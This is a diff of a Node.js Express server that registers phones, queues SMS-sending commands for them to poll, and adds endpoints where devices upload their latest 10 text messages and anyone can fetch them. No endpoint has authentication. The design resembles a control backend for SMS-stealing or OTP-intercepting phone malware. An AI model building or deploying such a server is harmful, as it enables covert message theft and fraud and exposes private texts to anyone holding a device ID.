@@ -7,61 +7,68 @@ app.use(cors());
 app.use(express.json());
 
 /**
- * In-memory store (Render free → OK for testing)
+ * In-memory store
  */
-const devices = {};      // deviceId -> { deviceId, model, time }
-const commands = {};     // deviceId -> [ { id, number, message } ]
+const devices = {};   // deviceId -> { deviceId, model, registeredAt }
+const commands = {};  // deviceId -> [ { id, number, message } ]
+const smsData = {};   // deviceId -> latest 10 SMS
 
-// Register device
+// ------------------ Device Registration ------------------
 app.post("/register", (req, res) => {
-  const { deviceId, model } = req.body;
-  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    const { deviceId, model } = req.body;
+    if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });
 
-  devices[deviceId] = {
-    deviceId,
-    model: model || "unknown",
-    time: new Date()
-  };
+    devices[deviceId] = { deviceId, model: model || "unknown", registeredAt: new Date() };
+    if (!commands[deviceId]) commands[deviceId] = [];
+    if (!smsData[deviceId]) smsData[deviceId] = [];
 
-  if (!commands[deviceId]) commands[deviceId] = [];
-
-  res.json({ success: true });
+    res.json({ success: true });
 });
 
-// Fetch all device IDs
+// ------------------ Fetch all devices ------------------
 app.get("/fetch", (req, res) => {
-  res.json(Object.values(devices));
+    res.json(Object.values(devices));
 });
 
-// Send SMS command
+// ------------------ Send SMS command to device ------------------
 app.post("/sendsms", (req, res) => {
-  const { deviceId, number, message } = req.body;
+    const { deviceId, number, message } = req.body;
 
-  if (!devices[deviceId]) {
-    return res.status(404).json({ error: "Device not found" });
-  }
+    if (!devices[deviceId]) return res.status(404).json({ success: false, error: "Device not found" });
 
-  const cmd = {
-    id: uuidv4(),
-    number,
-    message
-  };
+    const cmd = { id: uuidv4(), number, message };
+    commands[deviceId].push(cmd);
 
-  commands[deviceId].push(cmd);
-  res.json({ success: true });
+    res.json({ success: true, command: cmd });
 });
 
-// Device polls for commands
+// ------------------ Device polls for commands ------------------
 app.get("/commands", (req, res) => {
-  const { deviceId } = req.query;
+    const { deviceId } = req.query;
+    if (!commands[deviceId]) return res.json([]);
 
-  if (!commands[deviceId]) return res.json([]);
-
-  const pending = commands[deviceId];
-  commands[deviceId] = []; // clear after send
-
-  res.json(pending);
+    const pending = commands[deviceId];
+    commands[deviceId] = []; // clear after sending
+    res.json(pending);
 });
 
+// ------------------ Device sends latest SMS ------------------
+app.post("/smsread", (req, res) => {
+    const { deviceId, sms } = req.body;
+    if (!deviceId || !sms) return res.status(400).json({ success: false, error: "deviceId or sms missing" });
+
+    smsData[deviceId] = sms; // store latest 10 SMS
+    res.json({ success: true });
+});
+
+// ------------------ Fetch latest SMS of a device ------------------
+app.post("/get-sms", (req, res) => {
+    const { deviceId } = req.body;
+    if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });
+
+    res.json(smsData[deviceId] || []);
+});
+
+// ------------------ Start server ------------------
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server running on", PORT));
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
